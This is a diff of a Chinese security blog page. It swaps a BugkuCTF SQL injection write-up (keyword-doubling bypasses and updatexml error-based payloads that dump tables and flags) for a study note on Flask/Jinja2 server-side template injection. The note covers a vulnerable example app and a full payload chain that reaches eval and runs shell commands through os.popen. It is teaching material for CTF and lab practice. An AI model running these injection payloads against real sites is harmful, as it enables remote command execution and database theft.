@@ -98,30 +98,28 @@
 
 
 
-  <meta name="description" content="第一次sql注入 最近一直在做BugCTF web的题，今天遇到了十分涨姿势的一道SQL注入，就是多次了。  这道题一进去看到一个?id=1就猜测多半存在sql注入了，但是在id后面输入&apos;，页面报错，大致可以确定存在sql注入了，然后按照一般sql注入的步骤去操作， 测试了两组payload，都是报错界面（后面的一个-其实都是两个-号） id=1&apos;+or+1=1--+ id=1&apos;+order+by">
-<meta name="keywords" content="sql">
+  <meta name="description" content="最近做题的时候碰到了ssti注入,去了解了一下,多数是存在与flask框架里或使用jinja2模块的web应用里,本事我是拒绝的,但是去学习了一下还是比较好懂的,这里对各位大佬的讲解,进行粗略的总结. ssti粗浅理解 ssti模块注入,实际上还是注入类型的一种,其原因都是信任用户输入或者没有进行适当数据过滤,进而导致执行恶意代码的问题.这里ssti也是类似的,先来看个例子吧,这个例子取自vulh">
+<meta name="keywords" content="security,CTF,others">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BugkuCTF 多次wp">
-<meta property="og:url" content="https://www.ebounce.cn/BugkuCTF-多次.html">
+<meta property="og:title" content="ssti漏洞学习笔记">
+<meta property="og:url" content="https://www.ebounce.cn/ssti漏洞学习笔记.html">
 <meta property="og:site_name" content="web小白成长记">
-<meta property="og:description" content="第一次sql注入 最近一直在做BugCTF web的题，今天遇到了十分涨姿势的一道SQL注入，就是多次了。  这道题一进去看到一个?id=1就猜测多半存在sql注入了，但是在id后面输入&apos;，页面报错，大致可以确定存在sql注入了，然后按照一般sql注入的步骤去操作， 测试了两组payload，都是报错界面（后面的一个-其实都是两个-号） id=1&apos;+or+1=1--+ id=1&apos;+order+by">
+<meta property="og:description" content="最近做题的时候碰到了ssti注入,去了解了一下,多数是存在与flask框架里或使用jinja2模块的web应用里,本事我是拒绝的,但是去学习了一下还是比较好懂的,这里对各位大佬的讲解,进行粗略的总结. ssti粗浅理解 ssti模块注入,实际上还是注入类型的一种,其原因都是信任用户输入或者没有进行适当数据过滤,进而导致执行恶意代码的问题.这里ssti也是类似的,先来看个例子吧,这个例子取自vulh">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://www.ebounce.cn/BugkuCTF-多次/1.png">
-<meta property="og:image" content="https://www.ebounce.cn/BugkuCTF-多次/2.png">
-<meta property="og:image" content="https://www.ebounce.cn/BugkuCTF-多次/3.png">
-<meta property="og:image" content="https://www.ebounce.cn/BugkuCTF-多次/4.png">
-<meta property="og:image" content="https://www.ebounce.cn/BugkuCTF-多次/5.png">
-<meta property="og:image" content="https://www.ebounce.cn/BugkuCTF-多次/6.png">
-<meta property="og:image" content="https://www.ebounce.cn/BugkuCTF-多次/7.png">
-<meta property="og:image" content="https://www.ebounce.cn/BugkuCTF-多次/8.png">
-<meta property="og:image" content="https://www.ebounce.cn/BugkuCTF-多次/9.png">
-<meta property="og:image" content="https://www.ebounce.cn/BugkuCTF-多次/11.png">
-<meta property="og:image" content="https://www.ebounce.cn/BugkuCTF-多次/10.png">
-<meta property="og:updated_time" content="2019-02-22T10:36:32.218Z">
+<meta property="og:image" content="https://www.ebounce.cn/ssti漏洞学习笔记/1-1.png">
+<meta property="og:image" content="https://www.ebounce.cn/ssti漏洞学习笔记/1-2.png">
+<meta property="og:image" content="https://www.ebounce.cn/ssti漏洞学习笔记/1-3.png">
+<meta property="og:image" content="https://www.ebounce.cn/ssti漏洞学习笔记/1-4.png">
+<meta property="og:image" content="https://www.ebounce.cn/ssti漏洞学习笔记/1-5.png">
+<meta property="og:image" content="https://www.ebounce.cn/ssti漏洞学习笔记/1-6.png">
+<meta property="og:image" content="https://www.ebounce.cn/ssti漏洞学习笔记/1-8.png">
+<meta property="og:image" content="https://www.ebounce.cn/ssti漏洞学习笔记/1-9.png">
+<meta property="og:image" content="https://www.ebounce.cn/ssti漏洞学习笔记/1-10.png">
+<meta property="og:updated_time" content="2019-07-16T11:54:24.411Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="BugkuCTF 多次wp">
-<meta name="twitter:description" content="第一次sql注入 最近一直在做BugCTF web的题，今天遇到了十分涨姿势的一道SQL注入，就是多次了。  这道题一进去看到一个?id=1就猜测多半存在sql注入了，但是在id后面输入&apos;，页面报错，大致可以确定存在sql注入了，然后按照一般sql注入的步骤去操作， 测试了两组payload，都是报错界面（后面的一个-其实都是两个-号） id=1&apos;+or+1=1--+ id=1&apos;+order+by">
-<meta name="twitter:image" content="https://www.ebounce.cn/BugkuCTF-多次/1.png">
+<meta name="twitter:title" content="ssti漏洞学习笔记">
+<meta name="twitter:description" content="最近做题的时候碰到了ssti注入,去了解了一下,多数是存在与flask框架里或使用jinja2模块的web应用里,本事我是拒绝的,但是去学习了一下还是比较好懂的,这里对各位大佬的讲解,进行粗略的总结. ssti粗浅理解 ssti模块注入,实际上还是注入类型的一种,其原因都是信任用户输入或者没有进行适当数据过滤,进而导致执行恶意代码的问题.这里ssti也是类似的,先来看个例子吧,这个例子取自vulh">
+<meta name="twitter:image" content="https://www.ebounce.cn/ssti漏洞学习笔记/1-1.png">
 
 
 
@@ -129,7 +127,7 @@
 
   
   
-  <link rel="canonical" href="https://www.ebounce.cn/BugkuCTF-多次">
+  <link rel="canonical" href="https://www.ebounce.cn/ssti漏洞学习笔记">
 
 
 
@@ -139,7 +137,7 @@
   };
 </script>
 
-  <title>BugkuCTF 多次wp | web小白成长记</title>
+  <title>ssti漏洞学习笔记 | web小白成长记</title>
   
 
 
@@ -306,7 +304,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.ebounce.cn/BugkuCTF-多次.html">
+    <link itemprop="mainEntityOfPage" href="https://www.ebounce.cn/ssti漏洞学习笔记.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="E-bounce">
@@ -323,7 +321,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">BugkuCTF 多次wp
+          <h1 class="post-title" itemprop="name headline">ssti漏洞学习笔记
 
               
             
@@ -349,23 +347,13 @@
                 
               
 
-              <time title="创建时间：2019-01-28 19:30:06" itemprop="dateCreated datePublished" datetime="2019-01-28T19:30:06+08:00">2019-01-28</time>
+              <time title="创建时间：2019-07-16 16:27:21 / 修改时间：19:54:24" itemprop="dateCreated datePublished" datetime="2019-07-16T16:27:21+08:00">2019-07-16</time>
             </span>
           
 
           
             
 
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-02-22 18:36:32" itemprop="dateModified" datetime="2019-02-22T18:36:32+08:00">2019-02-22</time>
-              </span>
             
           
 
@@ -413,7 +401,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span title="本文字数">1.8k</span>
+              <span title="本文字数">3.2k</span>
             </span>
           
 
@@ -425,7 +413,7 @@
               
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
               
-              <span title="阅读时长">2 分钟</span>
+              <span title="阅读时长">3 分钟</span>
             </span>
           
 
@@ -444,55 +432,69 @@
       
 
       
-        <h1>第一次sql注入</h1>
-最近一直在做BugCTF web的题，今天遇到了十分涨姿势的一道SQL注入，就是多次了。
-<img src="/BugkuCTF-多次/1.png">
-这道题一进去看到一个?id=1就猜测多半存在sql注入了，但是在id后面输入'，页面报错，大致可以确定存在sql注入了，然后按照一般sql注入的步骤去操作，
-测试了两组payload，都是报错界面（后面的一个-其实都是两个-号）
-<pre><code>id=1'+or+1=1--+</code></pre>
-<pre><code>id=1'+order+by+2--+</code></pre>
-于是判断该题可能过滤了一些关键词，下面使用新姿势来测试究竟过滤了哪些关键词--异或法
-（sql中的异或符号为^，在该符号两侧的表达式均为真或均为假时，会返回假，其余情况返回真，于是使用该方法来判断过滤的关键词）
-<img src="/BugkuCTF-多次/2.png">
-<pre><code>id=1'^(length("or")!=0)--+</code></pre>
-返回了正常界面，由于已经验证过表达式id=1为真，根据异或的真值规则可以判断出只有后面的式子为假，而后面表达式的意思为判断or字符的长度为几,length()
-会返回字符长度，由于sql里面0=False，所以后面这句表达式在于判断or字符是否为0，也就是是不是被过滤了掉了，由返回结果可以判断出or字符确实是被过滤掉了，
-通过这种方法类似的，我们可以判断select union and 关键词都被过滤掉了，其它的关键词如union回显注入里面存在的table column schema where都未被过滤掉，下面
-就开始注入了，可以透过双写的方式绕过关键词过滤，
-查字段数：(这里只是or被过滤掉了，只需要双写or即可)
-<pre><code>id=1'+oorrder+by+2--+</code></pre>
-<img src="/BugkuCTF-多次/3.png">
-字段数为2，然后构造union查询注入，当然我们需要确定回显字段，
-<img src="/BugkuCTF-多次/4.png">
-<pre><code>id=x'+ununionion+seselectlect+1,2--+</code></pre>
-随后爆表名：
-<pre><code>id=x'+ununionion+seselectlect+1,group_concat(table_name)+from+infoorrmation_schema.tables+where+table_schema=database()--+</code></pre>
-<img src="/BugkuCTF-多次/5.png">
-爆列名：
-<img src="/BugkuCTF-多次/6.png">
-<pre><code>id=x'+ununionion+seselectlect+1,group_concat(column_name)+from+infoorrmation_schema.columns+where+table_name='flag1'--+</code></pre>
-爆值：
-flag1为：
-<pre><code>id=x'+ununionion+seselectlect+1,group_concat(flag1)+from+flag1--+</code></pre>
-<img src="/BugkuCTF-多次/7.png">
-然而flag并不是这个，转头去爆address的值
-<img src="/BugkuCTF-多次/8.png">
-<pre><code>id=x'+ununionion+seselectlect+1,group_concat(address)+from+flag1--+</code></pre>
-<h1>第二次sql注入</h1>
-点击进入了下一关又是一个sql注入，一样的id参数，而这次居然有sql的错误回显，但测试了一下union select注入似乎不可以
-这次我们需要使用updatexml()函数的报错回显注入，需要了解该函数的可以自行百度，该函数一共有三个参数，总之第二个参数
-似乎能和回显注入一样，能够执行，因此下面payload如下
-爆表名：
-<pre><code>id=1'and+updatexml(1,concat('*-',(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),'*-'),3)--+</code></pre>
-<img src="/BugkuCTF-多次/9.png">
-接着爆列名:
-<img src="/BugkuCTF-多次/11.png">
-<pre><code>id=1'and+updatexml(1,concat('*-',(select+group_concat(column_name)+from+information_schema.columns+where+table_name='flag2'),'*-'),3)--+</code></pre>
-最后爆值找到flag：
-<pre><code>id=1'and+updatexml(1,concat('*-',(select+flag2+from+flag2),'-*'),3)--+</code></pre>
-updatexml()感觉在这道题的报错注入里面更像式标识符
-<img src="/BugkuCTF-多次/10.png">
-到此为止本题结束。
+        <p>最近做题的时候碰到了ssti注入,去了解了一下,多数是存在与flask框架里或使用jinja2模块的web应用里,本事我是拒绝的,但是去学习了一下还是比较好懂的,这里对各位大佬的讲解,进行粗略的总结.</p>
+<h1>ssti粗浅理解</h1>
+ssti模块注入,实际上还是注入类型的一种,其原因都是信任用户输入或者没有进行适当数据过滤,进而导致执行恶意代码的问题.这里ssti也是类似的,先来看个例子吧,这个例子取自vulhub里的flask一节
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>, <span class="string">'guest'</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">"Hello "</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>这是一个非常简单的flaskweb应用,只是通过获得用户get进来的name参数,进行相应的显示,主要问题在于对用户输入的name参数是直接传给Template对象进行拼接的,没有进行过滤,随后利用render()方法进行渲染时,该方法会对用户输入进行解析,这就是ssti注入的成因了.<br>以下是简单示例:</p>
+<img src="/ssti漏洞学习笔记/1-1.png">
+<img src="/ssti漏洞学习笔记/1-2.png">
+<p>这里可以看见,服务器已经将我们输入的数据进行了解析并运行了,因此这里存在注入的问题,那么问题来了,我们需要知道payload是怎么来的,根据官方给的payload为:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h2>第一句payload</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br></pre></td></tr></table></figure>
+
+<h3>__class__</h3>
+先一步步来,我们将payload一行行拆开,了解每一行的作用到底是什么,首先我们需要知道在python中'.__class__'是用来获得当前数据实例化的类是什么的,举个例子:
+<img src="/ssti漏洞学习笔记/1-3.png">
+我们可以看到,利用'.__class__'获得了对应数据所使用的类,因此payload第一句是获得'[]'对应的类为"&ltclass 'list&gt'"
+<h3>__base__及其其他</h3>
+接着'.__bases__'和'.__mro__'类似,是获得该类的父类集合的元组,简单的例子如下:
+<img src="/ssti漏洞学习笔记/1-4.png">
+注意__mro__和__bases__的区别,__mro__会将本类包含,而__bases__则不会包含本类,顺便说以下__base__和__bases__不太同,简单举例如下:
+<img src="/ssti漏洞学习笔记/1-5.png">
+因此如果不是存在过滤的情况,可以直接使用__base__获得基本类(object),基本类(object)是所有类的父类
+<h3>__subclasses__()</h3>
+这个属性是用于查看类中所有存活子类的引用,可以理解为只要有子类应用该父类,其返回就会包含该子类,我们已经知道了object是所有类的父类,因此利用Object基类去调用该属性,会返回所有可调用的子类,如下图:
+<img src="/ssti漏洞学习笔记/1-6.png">
+因此第一条语句是在用for循环进行遍历寻找可调用类中的子类.
+<h2>第二条语句</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>name</strong>属性相信大家都不陌生了,这个属性常常用在</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if__name__==<span class="string">'__main__'</span></span><br></pre></td></tr></table></figure>
+
+<p>作为语句开始,他的作用是获得当前调用模块的名字,因此这条语句的作用是判断当前使用模块的名字是否为”catch_warnings”,同时我们需要知道是什么模块名字为”catch_warnings”,是我们用于系统命令操作的os模块,因为访问os模块都是从warnings.catch_warnings入手的,这里就相当于我们在寻找os模块</p>
+<h2>第三条语句</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个语句首先将查找到os模块进行实例化,然后利用<strong>globals</strong>查找该模块下一个包含可使用的方法和变量的字典,后面那个values()实际上是调用Python字典里面values()方法,将键值对的值取出并将这些值进行迭代,其值如下,都是方法或者变量</p>
+
+<h2>第四,五句语句</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这两句先是查找了b中类与字典类相同的变量和函数(模块中的函数是以键值对的形式存储的,因此需要寻找同字典类型的类),然后再在对应b中寻找有无’eval’为Key值的存在,举个例子就知道这条语句在干什么了,例子如下:</p>
+<img src="/ssti漏洞学习笔记/1-8.png">
+<p>这里我们看到已经找了eval函数的所在地了,现在需要做的只是使用它</p>
+<h2>最后一句语句</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里相当于调用了eval()方法执行我们需要注入的内容,然后利用<strong>import</strong>动态加载入了os模块,利用.popen()方法打开一条系统通道,在执行这条命令之后返回了一个file类型的对象,从而可以让我们读取执行命令之后的内容,随后利用file对象里的read方法进行读取,从而获得回显.</p>
+<h3>有关使用的问题</h3>
+不多说了直接上图吧
+这里使用Linux里的id命令:
+<img src="/ssti漏洞学习笔记/1-9.png">
+类似的还可以执行ls命令:
+<img src="/ssti漏洞学习笔记/1-10.png">
+这就已经可以拿到webshell了
+<h2>有关另一种payload</h2>
+这种payload思考方法和前面的类似,都是通过基类object进行查找,找到os所在的位置然后执行相应的系统命令,同类型的payload有:
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.base__.__subclasses__()[(warnings.catch_warnings所在位置)].__init__.func_globals.linecache.os.popen(<span class="string">'id'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>这里利用了一个.func_globals属性是用于查找该类下的全局函数,后面的.linecache则是读取任意文件的某一行,通过这个方法找到os,然后再利用popen()执行系统命令,并用read进行读取.<br>更多信息可以参考以下文章:<br><a href="https://blog.csdn.net/yh1013024906/article/details/84330056" target="_blank" rel="noopener">FLASK模板注入 （SSTI）</a><br><a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">探索Flask/Jinja2中的服务端模版注入（二） </a><br><a href="https://xz.aliyun.com/t/2308" target="_blank" rel="noopener">用python继承链搞事情</a><br>——————the end———————-</p>
+
       
     </div>
 
@@ -526,7 +528,7 @@ updatexml()感觉在这道题的报错注入里面更像式标识符
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     
-    <a href="https://www.ebounce.cn/BugkuCTF-多次.html" title="BugkuCTF 多次wp">https://www.ebounce.cn/BugkuCTF-多次.html</a>
+    <a href="https://www.ebounce.cn/ssti漏洞学习笔记.html" title="ssti漏洞学习笔记">https://www.ebounce.cn/ssti漏洞学习笔记.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
@@ -537,15 +539,6 @@ updatexml()感觉在这道题的报错注入里面更像式标识符
 
     <footer class="post-footer">
       
-        
-          
-        
-        <div class="post-tags">
-          
-            <a href="/tags/sql/" rel="tag"><i class="fa fa-tag"># sql</i></a>
-          
-        </div>
-      
 
       
       
@@ -555,8 +548,8 @@ updatexml()感觉在这道题的报错注入里面更像式标识符
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/sqli-labs-1-5-小结.html" rel="next" title="sqli labs(1-5)小结">
-                <i class="fa fa-chevron-left"></i> sqli labs(1-5)小结
+              <a href="/CVE-2018-12613一点理解.html" rel="next" title="CVE-2018-12613一点理解">
+                <i class="fa fa-chevron-left"></i> CVE-2018-12613一点理解
               </a>
             
           </div>
@@ -564,10 +557,6 @@ updatexml()感觉在这道题的报错注入里面更像式标识符
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/有关sql报错注入一点小坑.html" rel="prev" title="有关sql报错注入一点小坑">
-                有关sql报错注入一点小坑 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -755,7 +744,7 @@ updatexml()感觉在这道题的报错注入里面更像式标识符
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">第一次sql注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">第二次sql注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">ssti粗浅理解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.1.</span> <span class="nav-text">第一句payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.1.1.</span> <span class="nav-text">__class__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.1.2.</span> <span class="nav-text">__base__及其其他</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.1.3.</span> <span class="nav-text">__subclasses__()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.2.</span> <span class="nav-text">第二条语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.3.</span> <span class="nav-text">第三条语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.4.</span> <span class="nav-text">第四,五句语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.5.</span> <span class="nav-text">最后一句语句</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.5.1.</span> <span class="nav-text">有关使用的问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.6.</span> <span class="nav-text">有关另一种payload</span></a></li></ol></li></ol></div>
             
 
           </div>
